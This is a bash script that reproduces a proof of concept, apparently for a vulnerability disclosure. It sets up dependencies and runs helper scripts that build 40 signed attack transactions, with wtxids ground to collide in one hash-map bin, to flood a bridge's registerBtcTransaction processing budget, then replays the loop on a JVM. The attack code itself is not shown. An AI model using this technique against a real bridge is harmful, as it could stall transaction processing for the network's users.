#!/usr/bin/env bash
# One-command reproduction of the registerBtcTransaction budget-flood PoC.
#
#   ./run_poc.sh
#
# Creates a local venv with coincurve (libsecp256k1), jpype1 and jdk4py (a JRE),
# then:
#   1. builds 40 attack txs + 40 control txs with real ECDSA signatures and
#      wtxids ground into bin 0 of the pending map,
#   2. verifies every signature/txid/outputs independently,
#   3. replays updateBridgeBtcTransactions() against a real
#      java.util.concurrent.ConcurrentHashMap in a real JVM.
set -euo pipefail
cd "$(dirname "$0")"

PY=${PYTHON:-python3}
VENV=${VENV:-.venv}

if [ ! -x "$VENV/bin/python" ]; then
  echo "== creating venv"
  "$PY" -m venv "$VENV"
fi
"$VENV/bin/pip" -q install --disable-pip-version-check coincurve jpype1 jdk4py

# jdk4py ships a JRE; chm_order.py locates libjvm.so through JAVA_HOME or jdk4py
export JAVA_HOME="$("$VENV/bin/python" -c 'import jdk4py, os; print(jdk4py.JAVA_HOME)')"

echo
echo "== [0/2] building transactions"
"$VENV/bin/python" gen_attack_txs.py --count 40

echo
echo "== [1/2] verifying transactions + decisions"
"$VENV/bin/python" verify_txs.py

echo
echo "== [2/2] replaying the budget loop on a real JVM"
"$VENV/bin/python" chm_order.py out/wtxids.txt

echo
echo "reports written to:"
echo "  out/verify_report.txt   (transaction + decision verification)"
echo "  out/chm_report.txt      (JVM replay)"
